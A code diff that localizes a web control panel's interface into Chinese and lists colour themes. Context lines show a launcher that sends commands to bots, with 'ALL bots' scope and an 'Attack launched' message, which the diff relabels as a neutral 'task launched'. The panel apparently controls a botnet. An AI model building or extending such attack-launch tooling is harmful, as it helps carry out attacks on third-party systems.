-    '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
+    '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || '全部 Bot') + '</span></div>';
   r.innerHTML = html;
 }
 
@@ -3515,9 +3515,9 @@ function wizardLaunch() {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: cmd, botID: bot })
   }).then(function(r) { return r.json(); }).then(function(d) {
-    if (d.success) { showToast('Attack launched: ' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
-    else showToast(d.message || 'Failed', false);
-  }).catch(function() { showToast('Request failed', false); });
+    if (d.success) { showToast('任务已启动：' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
+    else showToast(d.message || '失败', false);
+  }).catch(function() { showToast('请求失败', false); });
 }
 
 wizardInit();
@@ -3526,9 +3526,9 @@ wizardInit();
 // GLOBAL PANEL THEMES
 // ===========================================================================
 var GLOBAL_THEMES = {
-  light:     { name:'Light',           _dataTheme:'light' },
-  dark:      { name:'Dark',            _dataTheme:'dark' },
-  default:   { name:'Default (Dark)',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
+  light:     { name:'浅色',           _dataTheme:'light' },
+  dark:      { name:'深色',            _dataTheme:'dark' },
+  default:   { name:'默认（深色）',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
   monokai:   { name:'Monokai',         bgBase:'#1a1a17', bgPrimary:'#272822', bgCard:'#2e2f28', bgCardHover:'#3a3b32', bgInput:'#1e1f1a', bgElevated:'#3e3d32', border:'#49483e', borderLight:'#5a5949', text:'#f8f8f2', textMuted:'#a59f85', textDim:'#75715e', accent:'#f92672', accentHover:'#e6195f', green:'#a6e22e', red:'#f92672', yellow:'#e6db74', blue:'#66d9ef', cyan:'#a1efe4', headerBg:'rgba(39,40,34,0.9)' },
   dracula:   { name:'Dracula',         bgBase:'#1e1f29', bgPrimary:'#282a36', bgCard:'#2d2f3d', bgCardHover:'#343746', bgInput:'#21222c', bgElevated:'#383a4a', border:'#44475a', borderLight:'#555869', text:'#f8f8f2', textMuted:'#8a8ea0', textDim:'#6272a4', accent:'#bd93f9', accentHover:'#a87cf5', green:'#50fa7b', red:'#ff5555', yellow:'#f1fa8c', blue:'#8be9fd', cyan:'#8be9fd', headerBg:'rgba(40,42,54,0.9)' },
   solarized: { name:'Solarized Dark',  bgBase:'#001e26', bgPrimary:'#002b36', bgCard:'#073642', bgCardHover:'#0a4050', bgInput:'#002028', bgElevated:'#0a4050', border:'#2a5a68', borderLight:'#3a6a78', text:'#839496', textMuted:'#657b83', textDim:'#586e75', accent:'#268bd2', accentHover:'#1a7ab8', green:'#859900', red:'#dc322f', yellow:'#b58900', blue:'#268bd2', cyan:'#2aa198', headerBg:'rgba(0,43,54,0.9)' },
@@ -3601,13 +3601,13 @@ function applyGlobalTheme(name) {
 // TERMINAL THEMES
 // ===========================================================================
 var SHELL_THEMES = {
-  default:   { name: 'Default',    bg: '#0d1117', fg: '#c9d1d9', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
+  default:   { name: '默认',    bg: '#0d1117', fg: '#c9d1d9', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
   monokai:   { name: 'Monokai',    bg: '#272822', fg: '#f8f8f2', black: '#272822', red: '#f92672', green: '#a6e22e', yellow: '#f4bf75', blue: '#66d9ef', magenta: '#ae81ff', cyan: '#a1efe4', white: '#f8f8f2', brightBlack: '#75715e', brightRed: '#f92672', brightGreen: '#a6e22e', brightYellow: '#f4bf75', brightBlue: '#66d9ef', brightMagenta: '#ae81ff', brightCyan: '#a1efe4', brightWhite: '#f9f8f5' },
   dracula:   { name: 'Dracula',    bg: '#282a36', fg: '#f8f8f2', black: '#21222c', red: '#ff5555', green: '#50fa7b', yellow: '#f1fa8c', blue: '#bd93f9', magenta: '#ff79c6', cyan: '#8be9fd', white: '#f8f8f2', brightBlack: '#6272a4', brightRed: '#ff6e6e', brightGreen: '#69ff94', brightYellow: '#ffffa5', brightBlue: '#d6acff', brightMagenta: '#ff92df', brightCyan: '#a4ffff', brightWhite: '#ffffff' },
   solarized: { name: 'Solarized',  bg: '#002b36', fg: '#839496', black: '#073642', red: '#dc322f', green: '#859900', yellow: '#b58900', blue: '#268bd2', magenta: '#d33682', cyan: '#2aa198', white: '#eee8d5', brightBlack: '#586e75', brightRed: '#cb4b16', brightGreen: '#586e75', brightYellow: '#657b83', brightBlue: '#839496', brightMagenta: '#6c71c4', brightCyan: '#93a1a1', brightWhite: '#fdf6e3' },
   nord:      { name: 'Nord',       bg: '#2e3440', fg: '#d8dee9', black: '#3b4252', red: '#bf616a', green: '#a3be8c', yellow: '#ebcb8b', blue: '#81a1c1', magenta: '#b48ead', cyan: '#88c0d0', white: '#e5e9f0', brightBlack: '#4c566a', brightRed: '#bf616a', brightGreen: '#a3be8c', brightYellow: '#ebcb8b', brightBlue: '#81a1c1', brightMagenta: '#b48ead', brightCyan: '#8fbcbb', brightWhite: '#eceff4' },
   matrix:    { name: 'Matrix',     bg: '#0a0a0a', fg: '#00ff41', black: '#0a0a0a', red: '#00ff41', green: '#00ff41', yellow: '#33ff66', blue: '#00cc33', magenta: '#00ff41', cyan: '#33ff66', white: '#00ff41', brightBlack: '#003300', brightRed: '#33ff66', brightGreen: '#33ff66', brightYellow: '#66ff99', brightBlue: '#33ff66', brightMagenta: '#33ff66', brightCyan: '#66ff99', brightWhite: '#ccffcc' },
-  light:     { name: 'Light',      bg: '#ffffff', fg: '#1f1f1f', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' }
+  light:     { name: '浅色',      bg: '#ffffff', fg: '#1f1f1f', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' }
 };
 
 function applyShellTheme(name) {
